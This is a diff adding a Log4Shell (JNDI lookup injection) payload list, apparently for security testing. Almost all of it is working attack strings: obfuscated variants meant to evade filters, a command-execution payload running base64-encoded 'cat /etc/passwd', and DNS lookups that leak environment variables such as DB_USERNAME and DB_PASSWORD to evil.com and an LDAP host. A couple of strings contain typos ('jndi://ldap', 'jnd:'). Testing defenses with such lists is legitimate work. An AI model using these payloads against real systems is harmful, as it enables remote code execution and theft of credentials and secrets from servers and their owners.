@@ -1,0 +1,30 @@
+#Base test string for testing and a default payload
+${jndi:(protocol)://(host):(port)/(resource)}
+
+#e.g. ${jndi:ldap://192.168.1.1:389/evil}
+#some known protocols in the wild: ldap, dns, rmi, http, https
+
+#Mangles are based on modification of the string using ${} and declarations/variables
+${jndi:${lower:l}${lower:d}ap://192.168.1.1:389/evil}
+
+#a more complex one
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//192.168.1.1:389/exploit}
+
+#another example
+${${::-j}nd${::-i}:ldap://192.168.1.1:389/a}
+
+#other variations can be used calling out env or other items
+${${env:a-j}ndi:ldap://192.168.1.1:389/evil}
+
+#you can break the brackets and it can potentially fire too
+${jndi:ldap://192.168.1.1:389/evil
+
+#Command execution potentially via a string, the base64 encoded command is the command to execute
+${jndi:ldap://192.168.1.1:389/Basic/Command/Base64/Y2F0IC9ldGMvcGFzc3dkCg==}
+#in this example, "cat /etc/passwd" is the base64 encoded payload
+
+#DNS can be used to leak values in environmental variables
+${jndi://ldap://${env:HOST}.evil.com/a}
+
+#enviromental variable leaking via dns can be done with env:(variable), so ${env:DB_HOST}
+${jnd:ldap://192.168.1.1:389/a_${env:DB_HOST}_${env:DB_USERNAME}_${env:DB_PASSWORD}
